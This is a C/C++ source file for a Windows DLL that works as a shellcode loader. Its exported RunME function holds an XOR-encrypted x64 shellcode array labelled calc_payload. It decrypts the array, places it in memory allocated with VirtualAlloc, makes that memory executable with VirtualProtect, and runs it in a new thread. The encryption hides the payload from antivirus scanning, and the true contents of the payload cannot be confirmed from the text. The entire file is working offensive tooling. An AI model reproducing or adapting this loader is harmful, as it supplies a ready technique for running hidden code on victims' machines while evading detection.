#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>


void XOR(char * data, size_t data_len, char * key, size_t key_len) {
	int j;
	j = 0;
	for (int i = 0; i < data_len; i++) {
		if (j == key_len - 1) j = 0;

		data[i] = data[i] ^ key[j];
		j++;
	}
}

BOOL APIENTRY DllMain(HMODULE hModule,  DWORD  ul_reason_for_call, LPVOID lpReserved) {

    switch (ul_reason_for_call)  {
    case DLL_PROCESS_ATTACH:
    case DLL_PROCESS_DETACH:
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
        break;
    }
    return TRUE;
}

extern "C" {
__declspec(dllexport) BOOL WINAPI RunME(void) {
	void * exec_mem;
	BOOL rv;
	HANDLE th;
	DWORD oldprotect = 0;

	unsigned char calc_payload[] = "\x9a\x2e\xfa\x8e\x96\x8e\xb5\x6a\x66\x66\x38\x3b\x27\x36\x2b\x3b\x30\x2e\x48\xb8\x3\x2e\xf2\x38\x6\x2e\xf2\x38\x7e\x2e\xf2\x38\x46\x2e\xf2\x18\x36\x2b\x48\xa3\x2e\x69\xce\x20\x2c\x2e\x48\xaa\xca\x5a\x18\x16\x64\x4a\x59\x2b\xa7\xaf\x74\x2b\x67\xa7\x9b\x87\x34\x2e\xf2\x38\x46\x27\x28\xe1\x24\x5a\x31\x6b\xb6\x0\xf8\x12\x7e\x6d\x7b\x65\xe3\x14\x79\x6a\x66\xed\xf9\xe2\x66\x66\x79\x22\xe3\xa6\xd\xd\x2e\x67\xa9\x2e\xed\x26\x59\x23\x67\xb6\xf2\x22\x7e\x36\x9a\x3c\x2e\x99\xb0\x2b\xed\x52\xf1\x27\x57\xaf\x31\x6b\xb0\x2e\x48\xaa\xca\x27\xb8\xa3\x6b\x27\x78\xab\x5e\x86\xc\x9b\x2a\x65\x35\x4e\x6e\x23\x40\xbb\x13\xbe\x21\x2e\xed\x26\x5d\x23\x67\xb6\x1f\x2b\xed\x6a\x31\x2e\xed\x26\x65\x23\x67\xb6\x38\xe1\x62\xee\x31\x6b\xb6\x27\x21\x2b\x3e\x38\x20\x30\x27\x3e\x38\x33\x27\x3c\x31\xe9\x8a\x46\x38\x38\x99\x86\x21\x2b\x3f\x3c\x31\xe1\x74\x8f\x32\x95\x99\x99\x24\x22\x57\xbd\x2a\x23\xd8\x11\x10\x4\xf\x8\x1c\x1e\x66\x27\x2f\x22\xef\x87\x30\xad\xa4\x2a\xe\x4c\x61\x99\xac\x39\x35\x2e\xf0\x8b\x35\x3c\x34\x5b\xa6\x2b\x48\xa3\x35\x35\x30\xd0\x5c\x30\x0\xcd\x66\x66\x79\x6a\x99\xb3\x91\x67\x66\x66\x79\x59\x48\x5e\x4b\x44\x57\x55\x41\x44\x57\x54\x4c\x6a\x3c\x2e\xf0\xab\x2f\xa1\xb9\xfa\x79\x66\x79\x27\x57\xaf\x2a\x39\xc\x65\x2a\x23\xdc\x31\xf0\xf5\xa0\x66\x79\x6a\x66\x99\xac\x82\xed\x66\x79\x6a\x49\x3c\x2f\x1e\x10\x1c\x3c\x2c\xa\xb\x12\x5f\x32\x29\x48\x23\x53\x2b\x1f\xc\x4b\x10\x28\x5c\x31\x20\x1a\x12\x1e\x33\x48\x33\x57\x50\x2f\x2c\x12\x3f\x8\xb\x25\x2b\x10\x4\x10\x36\x26\x1b\x4\x53\x4a\xc\x2d\xc\x9\xb\x34\xa\x1e\x5b\x5e\x52\x31\x9\x53\x32\x30\x12\x2f\xd\x20\x58\x2e\x5f\x2b\x35\x5e\x27\x3\x1f\x3e\x13\x28\x47\x1f\x28\x41\x23\x11\x23\x34\x58\x55\xd\x18\x10\x9\x2f\x23\x5b\x30\x3f\x37\x5a\x21\x33\x13\x22\x3f\x22\x48\x5f\x12\xe\x13\x28\x52\x50\x34\x59\x53\x7\xa\x3f\x27\x30\x4d\xc\x53\x0\x41\x3\x53\x2d\x0\x2c\x25\x52\x79\x22\xef\xa7\x2a\x30\x27\x3e\x34\x5b\xaf\x35\x31\xd2\x66\x54\xd1\xee\x66\x66\x79\x6a\x36\x35\x2a\x23\xa1\xa4\x92\x3f\x48\x5d\x86\xbf\x2e\xef\xbf\x0\x6c\x39\x31\xe3\x97\xc\x66\x30\x34\xe\xf9\x59\x66\x66\x30\xe3\x86\xc\x7d\x2b\x3f\x2f\xc3\x1f\x20\xf8\xff\x6a\x66\x66\x79\x95\xb3\x2b\x48\xaa\x35\x3c\x31\xe3\x97\x2b\x48\xa3\x2b\x57\xb0\x39\x35\x2f\xbe\xa8\x4b\x60\x61\x11\x99\xb3\xfc\xaa\x13\x79\x31\xad\xa7\xee\x6a\x6a\x66\x2f\xc3\x2e\x96\x53\x99\x6a\x66\x66\x79\x95\xb3\x2e\x86\xa5\x12\x64\x92\xc0\x8e\x33\x79\x6a\x66\x35\x20\x0\x26\x3c\x30\xe3\xb7\xa7\x9b\x7a\x2f\xa1\xb9\x6a\x76\x66\x79\x23\xdc\x3e\xdd\x39\x83\x66\x79\x6a\x66\x99\xac\x22\xf5\x35\x2a\x22\xef\x81\x31\xe3\x97\x2e\xf0\xb0\x2f\xa1\xb9\x6a\x46\x66\x79\x23\xef\x9f\x30\xd0\x74\xf0\xf0\x88\x66\x66\x79\x6a\x99\xb3\x31\xe9\xa2\x46\xfc\xaa\x12\xd4\x1f\xe1\x61\x2e\x78\xa9\xe3\xa6\xc\xb8\x3e\xa5\x21\x0\x66\x3f\x30\xad\xa4\x96\xcc\xc8\x30\x99\xac";
	unsigned int calc_len = sizeof(calc_payload);
	char key[] = "ffyj";

	// Allocate a buffer for payload
	exec_mem = VirtualAlloc(0, calc_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	printf("%-20s : 0x%-016p\n", "calc_payload addr", (void *)calc_payload);
	printf("%-20s : 0x%-016p\n", "exec_mem addr", (void *)exec_mem);

	printf("\nHit me 1st!\n");
	getchar();
	Sleep(3000);

	// Decrypt (DeXOR) the payload
	XOR((char *) calc_payload, calc_len, key, sizeof(key));
	// Copy the payload to allocated buffer
	RtlMoveMemory(exec_mem, calc_payload, calc_len);
	// Make the buffer executable
	rv = VirtualProtect(exec_mem, calc_len, PAGE_EXECUTE_READ, &oldprotect);

	printf("\nHit me 2nd!\n");
	getchar();

	// If all good, launch the payload
	if ( rv != 0 ) {
			th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
			WaitForSingleObject(th, -1);
	}

	return TRUE;
}
}
